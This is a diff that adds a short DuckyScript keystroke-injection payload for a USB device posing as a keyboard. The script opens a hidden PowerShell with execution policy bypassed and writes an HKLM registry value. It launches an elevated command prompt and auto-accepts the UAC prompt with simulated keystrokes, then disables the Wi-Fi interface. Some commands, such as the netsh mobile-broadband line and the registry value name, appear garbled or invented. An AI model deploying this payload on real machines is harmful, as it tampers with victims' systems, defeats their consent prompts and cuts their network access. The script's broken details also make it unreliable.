@@ -1,0 +1,14 @@
+DELAY 3000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -c "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization\Containers' -Name VSmbDisableOplocks -Value 1"
+ENTER
+DELAY 1000
+STRING Start-Process cmd -Verb runAs
+ENTER
+DELAY 1500
+LEFT
+ENTER
+DELAY 500
+STRING netsh interface set interface "Wi-Fi" disable && netsh mbn set conmode force=lte
+ENTER
